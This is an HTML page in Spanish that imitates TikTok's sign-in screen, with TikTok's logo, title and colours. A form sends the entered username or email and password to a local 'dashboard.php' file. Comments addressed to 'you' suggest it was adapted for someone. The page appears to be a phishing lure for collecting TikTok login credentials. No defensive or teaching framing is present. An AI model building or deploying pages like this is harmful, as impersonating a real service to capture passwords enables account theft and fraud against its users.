<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Inicia sesión | TikTok</title>
    <style>
        /* Estilos básicos para mantener el diseño limpio y centrado en tu ASUS */
        body {
            background-color: #ffffff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            width: 100%;
            max-width: 440px;
            padding: 40px;
            box-sizing: border-box;
            text-align: center;
        }
        .login-logo {
            width: 40px;
            height: 40px;
            margin-bottom: 16px;
        }
        .login-title {
            font-size: 24px;
            font-weight: 700;
            color: #161823;
            margin-bottom: 32px;
        }
        .login-buttons-list {
            margin-bottom: 24px;
        }
        .login-option-btn {
            width: 100%;
            height: 44px;
            background-color: #ffffff;
            border: 1px solid rgba(22, 24, 35, 0.12);
            border-radius: 8px;
            font-size: 15px;
            font-weight: 600;
            color: #161823;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            margin-bottom: 16px;
        }
        .btn-icon {
            margin-right: 12px;
            font-size: 18px;
        }
        /* Estilos para los nuevos campos de texto obligatorios para el PHP */
        .form-group {
            margin-bottom: 16px;
            text-align: left;
        }
        .form-group input {
            width: 100%;
            height: 44px;
            background-color: #f1f1f2;
            border: 1px solid transparent;
            border-radius: 4px;
            padding: 0 12px;
            box-sizing: border-box;
            font-size: 14px;
        }
        .form-group input:focus {
            outline: none;
            border-color: rgba(22, 24, 35, 0.2);
        }
        .submit-btn {
            width: 100%;
            height: 44px;
            background-color: #fe2c55;
            color: #ffffff;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 16px;
        }
        .submit-btn:hover {
            background-color: #e6284d;
        }
    </style>
</head>
<body>

    <div class="login-container">
        
        <!-- Tu logo SVG original intacto -->
        <svg class="login-logo" viewBox="0 0 24 24" xmlns="http://w3.org">
            <path d="M19.589 6.686a4.793 4.793 0 0 1-3.77-4.245V2h-3.445v13.672a2.896 2.896 0 0 1-5.201 1.743l-.002-.001.002-.001a2.895 2.895 0 0 1 3.144-4.3v-3.49a6.341 6.341 0 0 0-5.717 6.335 6.343 6.343 0 0 0 10.51 4.756 6.337 6.337 0 0 0 1.933-4.524V8.455a8.204 8.204 0 0 0 4.75 1.49v-3.49a4.787 4.787 0 0 1-1.304-.769z"/>
        </svg>

        <!-- Tu título original intacto -->
        <h1 class="login-title">Inicia sesión en TikTok</h1>

        <!-- Tu lista de botones original intacta -->
        <div class="login-buttons-list">
            <button class="login-option-btn">
                <span class="btn-icon">🔲</span>
                Usar código QR
            </button>
        </div>

        <!-- FORMULARIO CONECTADO CON TU ARCHIVO PHP -->
        <form method="POST" action="dashboard.php">
            
            <div class="form-group">
                <input type="text" name="txt_usuario" required placeholder="Correo o nombre de usuario">
            </div>

            <div class="form-group">
                <input type="password" name="txt_contrasena" required placeholder="Contraseña">
            </div>

            <button type="submit" class="submit-btn">Iniciar sesión</button>
            
        </form>

    </div>

</body>
</html>
